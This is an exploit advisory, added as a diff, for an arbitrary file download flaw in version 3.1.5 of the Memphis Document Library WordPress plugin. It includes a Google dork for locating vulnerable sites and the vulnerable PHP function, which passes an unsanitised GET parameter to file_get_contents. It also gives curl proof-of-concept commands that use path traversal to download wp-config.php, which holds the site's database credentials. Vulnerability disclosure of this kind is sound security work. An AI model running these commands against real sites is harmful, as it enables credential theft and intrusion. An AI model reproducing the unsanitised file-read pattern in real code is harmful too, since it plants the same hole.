@@ -1,0 +1,34 @@
+# Exploit Title: Arbitrary file download in Memphis Document Library 3.1.5
+# Google Dork: inurl:"mdocs-posts" -site:wordpress.org
+# Date: 22/03/2016
+# Exploit Author: Felipe Molina (@felmoltor)
+# Vendor Homepage: https://wordpress.org
+# Software Link: https://downloads.wordpress.org/plugin/memphis-documents-library.3.1.5.zip
+# Version: 3.1.5 (Vulnerable from 2.3 to 3.1.5, fixed in 3.1.6)
+# Tested on: Ubuntu 12.04, Wordpress 4.4.2.
+# CVE : N/A
+# Vulnerable file: memphis-documents-library/mdocs-downloads.php
+# Vulnerable function: mdocs_img_preview()
+# Vulnerable GET parameter: Injectable 'mdocs-img-preview'
+# Vulnerable line: 90 to 93
+# Vulnerable code:
+
+87 function mdocs_img_preview() {
+88 require_once(ABSPATH . 'wp-includes/pluggable.php');
+89 $upload_dir = wp_upload_dir();
+90 $image = $upload_dir['basedir'].MDOCS_DIR.$_GET['mdocs-img-preview'];
+91 $content = file_get_contents($image);
+92 header('Content-Type: image/jpeg');
+93 echo $content; exit();
+94 }
+
+# POC:
+
+curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php
+-o example-wp-config.php
+
+or if the plugin is not installed in the root folder of wordpress, for
+example in the folder "mdocs-posts":
+
+curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
+-o example-wp-config.php
